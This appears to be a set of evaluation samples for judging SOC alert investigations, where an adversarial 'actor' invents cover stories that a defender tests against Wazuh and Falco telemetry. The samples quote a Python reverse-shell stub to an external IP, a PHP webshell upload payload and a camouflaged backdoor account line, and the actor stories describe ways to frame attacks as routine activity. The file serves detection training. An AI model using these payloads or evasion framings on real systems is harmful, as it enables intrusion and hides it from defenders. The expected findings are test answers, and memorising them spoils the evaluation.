# Batch 02 — judge-alignment samples

Three mainline samples spanning **caught / survived / caught** across container
exec, FIM, and web-anomaly domains. Each carries expected outcome + expected
findings (the load-bearing learning signal).

---

## Sample 04 — caught (container shell, actor invents developer-debug cover)

**Expected outcome:** `caught`

**Rationale:** Actor frames the bash spawn as a developer SSH-debug session
from the office VPN. Oracle projects an SSH-parented interactive shell and no
external reverse-shell traffic. Defender's Falco co-occurrence lead found the
shell tied to a Python reverse-shell payload, and the rule-fire scope found
network redirection to an external IP on a non-standard port — refuting the
developer-debug framing.

**Expected actor observation (gist):** Actor's developer-SSH-debug framing collapsed once the Falco co-occurrence lead tied `bash -i` to a `gunicorn → python3` ancestry with a reverse-shell to `45.33.18.122:4444`.

### alert.json (trimmed)

```json
{
  "agent": {"name": "wazuh.manager"},
  "data": {
    "output": "Notice A shell was spawned in a container … process=bash container_name=app-01",
    "output_fields": {
      "container": {"id": "2427c46c4575", "name": "app-01", "image": {"repository": "internal/app", "tag": "v2.4"}},
      "proc": {"cmdline": "bash -i", "name": "bash"},
      "user": {"name": "appuser", "uid": 1001}
    }
  },
  "rule": {"id": "100001", "level": 8, "description": "Falco: Terminal shell spawned in container"}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: wazuh.falco-rules-by-container
  goal: enumerate Falco alerts from container 2427c46c4575 in ±30m around bash -i
  result: 3 clustered alerts from app-01. The focal shell event carried
    proc.name=bash, proc.pname=python3, proc.aname[2]=gunicorn. A co-firing
    "stdout/stdin redirected to network" event carried proc.name=python3,
    fd.rip=45.33.18.122, fd.rport=4444. The python3 command field decoded to
    a reverse-shell stub (`socket.connect(('45.33.18.122',4444))`).

Lead 1: wazuh.recent-rule-fires
  goal: 7d scope of Falco network-redirection fires from container 2427c46c4575
  result: 1 rule-100002 fire: proc.name=python3, fd.rip=45.33.18.122,
    fd.rport=4444. No office-VPN SSH-session-shaped network events.

## PHASE: ANALYZE
?developer-debug -- (process parent is python3 with b64 reverse-shell payload,
  not an SSH login session; outbound flow to unknown external IP)
?webapp-rce ++ (gunicorn → python3 child → bash -i plus network redirection is
  the canonical Python app RCE chain)
```

### actor_story.md

```
## Attack story
A backend developer SSH'd into app-01 from the office VPN to debug a failed
deploy. They invoked bash -i to attach to the failing container and ran a few
diagnostic commands.

## Goal
Frame the shell as routine maintenance traffic.

## Bypass
The defender will see bash -i in a container and assume the worst, but a
container-process lead would show the shell parented to an interactive SSH
session from an internal IP, fully consistent with developer access.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - {process: bash, parent: sshd, container: app-01, user: appuser}
- lead_position: 1
  events: []  # no external network-redirection fires expected for SSH debug
```

**Expected findings:**

- **`detection-confirmed`** on lead 0 (`wazuh.falco-rules-by-container`). The
  Falco co-occurrence result is the load-bearing refutation: the oracle
  projected `sshd → bash` (interactive login session), while the actual events
  carried `proc.pname=python3`, `proc.aname[2]=gunicorn`, and network
  redirection by the same Python process to `45.33.18.122:4444`. Without this
  container-scoped Falco lead, the developer-debug story is plausible from the
  trimmed alert surface alone.
- **`detection-confirmed`** on lead 1 (`wazuh.recent-rule-fires`). The
  network-redirection rule scope independently corroborates the RCE picture by
  showing a Python-owned redirect to `45.33.18.122:4444`, where the developer
  story projected no external redirect fires.
---

## Sample 05 — survived (FIM on /etc/passwd, single lead, no source attribution)

**Expected outcome:** `survived`

**Rationale:** Defender ran one lead — the syscheck diff itself. The diff
showed the same camouflaged service-account append the actor described. The
oracle projects the same diff shape (one new user, root-owned write). No lead
tested source attribution (config-management push vs operator shell vs
adversary), so the story's load-bearing claim is untouched.

**Expected actor observation (gist):** Actor's adversary-persistence story rested on source-of-change attribution (auditd / process-write) that no lead in this run supplied — the single syscheck diff cannot name the responsible process or account.

### alert.json (trimmed)

```json
{
  "agent": {"name": "target-endpoint", "ip": "172.22.0.13"},
  "data": {
    "syscheck": {
      "path": "/etc/passwd",
      "mode": "scheduled",
      "size_before": "1842", "size_after": "1903",
      "md5_before": "a1…", "md5_after": "b2…",
      "uname_after": "root", "gname_after": "root"
    }
  },
  "rule": {"id": "550", "level": 7, "description": "Integrity checksum changed."}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: wazuh.file-integrity-changes
  goal: enumerate which lines changed in /etc/passwd
  result: 1 line appended:
    appsvc:x:996:996::/var/lib/appsvc:/usr/sbin/nologin
  No deletions, no other modifications. Write attributed to uid=0 by syscheck.

## PHASE: ANALYZE
?authorized-provisioning + (nologin shell, system-account UID range,
  single-line append consistent with config-mgmt push)
?adversary-persistence + (cannot rule out — no source-of-change attribution)
Picture: insufficient. Source identity unresolved; both hypotheses live.
Disposition: inconclusive (low confidence). Termination: exhaustion.
```

### actor_story.md

```
## Attack story
An adversary with root on target-endpoint added a backdoor service account
("appsvc", uid=996, nologin shell) for later abuse via a setuid wrapper. The
choice of nologin shell and system-UID range is deliberate camouflage — it
looks like a config-mgmt push.

## Goal
Establish persistence that survives audit because it mimics legitimate
service-account provisioning.

## Bypass
The defender's available lead is the syscheck diff itself. Without
host-side audit (auditd / process-write attribution) or a CMDB record of
authorized accounts, the defender cannot distinguish this from an Ansible
push. The single-line append shape and the nologin shell are chosen
specifically to make the diff indistinguishable.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - path: /etc/passwd
      diff: "+ appsvc:x:996:996::/var/lib/appsvc:/usr/sbin/nologin"
      writer_uid: 0
```

**Expected findings:**

- **`lead-set`** gap: no lead attempted source-of-change attribution. With
  auditd or a host-side process-write feed, a write-to-/etc/passwd event
  would name the responsible process (ansible-playbook, useradd run from a
  shell, or an arbitrary binary). The investigation hit "exhaustion" with
  only one lead — the discriminating evidence was never requested. Tie to
  the actor's bypass framing: the story explicitly relies on this attribution
  gap.
- **`observability`** gap: the FIM/SIEM surface can answer file-change history,
  but this encounter evidences no whodata/process-write linkage for the event.
  The Wazuh syscheck result reports the *diff* and `uid=0`, not the responsible
  process or account; that is why the "who edited" question remains unresolved.

---

## Sample 06 — caught (web POST anomaly, actor invents scheduled-scanner cover)

**Expected outcome:** `caught`

**Rationale:** Actor frames a high-anomaly POST as a vendor's scheduled
vulnerability scan. Oracle projects scanner-typical breadth (many URLs, many
hosts, recognizable scanner UA). Defender's source-scoped URL-pattern + UA
leads showed none of that projected breadth: the same source only hit the
alert URL on one host and used a bare browser UA with exec-form parameters.
That refutes this scanner framing as written.

**Expected actor observation (gist):** Actor's scheduled-vulnerability-scanner cover collapsed once the URL/host-breadth and 30-day UA-distribution leads showed a single targeted `/admin/upload.php` endpoint with a bare `Mozilla/5.0` UA and no Nessus/Qualys/Rapid7 fingerprint.

### alert.json (trimmed)

```json
{
  "agent": {"name": "web-01"},
  "data": {
    "src_ip": "185.220.101.45",
    "url": "/admin/upload.php",
    "method": "POST",
    "user_agent": "Mozilla/5.0",
    "request_body_excerpt": "filename=shell.php&content=<?php system($_GET['c']);?>"
  },
  "rule": {"id": "31151", "level": 9, "description": "High-anomaly POST to admin path"}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: wazuh.agent-alerts-in-window
  goal: 24h URL coverage from 185.220.101.45
  result: 7 requests, all POST, all to /admin/upload.php on web-01. No other
    URLs, no other hosts. Inter-request 4-12 minutes.

Lead 1: wazuh.recent-rule-fires
  goal: 7d rule-31151 fires from 185.220.101.45 and against /admin/upload.php
  result: 7 fires (same as lead 0). No fires against other URLs, no other
    sources targeting the same URL.

Lead 2: wazuh.agent-alerts-in-window
  goal: 30d user-agent distribution for 185.220.101.45 across web alerts
  result: single UA "Mozilla/5.0" (bare). No Nessus/Qualys/Rapid7
    fingerprints in last 30d from this source.

## PHASE: ANALYZE
?scheduled-scan -- (single URL, single host, no scanner UA, no breadth)
?manual-rce-attempt ++ (request body contains a PHP webshell payload, single
  targeted endpoint, low-and-slow cadence consistent with manual operator)
```

### actor_story.md

```
## Attack story
185.220.101.45 is a contracted vulnerability scanner doing a weekly authenticated
sweep of admin endpoints. The POST to /admin/upload.php is one of many checks
in the suite; the payload is a benign scanner test string.

## Goal
Frame the activity as routine authorized scanning.

## Bypass
Most defenders look only at the offending request. A broader 24h URL/host pull
and a UA distribution should show the expected scanner breadth across admin
endpoints and recognizable vendor tooling, making the payload look like an
authorized benign test rather than a manual RCE attempt.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - {src_ip: 185.220.101.45, url: /admin/login.php, method: POST}
    - {src_ip: 185.220.101.45, url: /admin/users.php, method: GET}
    - {src_ip: 185.220.101.45, url: /admin/config.php, method: GET}
    - {src_ip: 185.220.101.45, url: /admin/upload.php, method: POST}
- lead_position: 1
  events:
    - {rule: 31151, src_ip: 185.220.101.45, target: web-01, url: /admin/upload.php, count: 1/week}
    - {rule: 31151, src_ip: 185.220.101.45, target: web-02, url: /admin/upload.php, count: 1/week}
- lead_position: 2
  events:
    - {src_ip: 185.220.101.45, user_agent: "Nessus SOAP", count: many}
```

**Expected findings:**

- **`detection-confirmed`** on lead 0 (URL/host breadth). The oracle projected
  scanner-typical URL breadth across multiple admin endpoints; actual data
  confined that same source's activity to `/admin/upload.php`. The
  load-bearing signal is the contradiction between the actor/oracle's
  source-scoped breadth projection and the actual confined URL set, not a
  general rule that scanners can never focus on one endpoint. Lead 1
  corroborates the same confined-host pattern, but it should not become a
  separate finding.
- **`detection-confirmed`** on lead 2 (UA distribution). Absence of any
  scanner-tool UA fingerprint over 30 days from the source refutes the
  "contracted scanner" framing as written — the actor projected recognizable
  vendor tooling, but the actual telemetry only showed a bare browser UA. A
  deliberately hidden scanner would be a different story requiring separate
  authorization evidence.
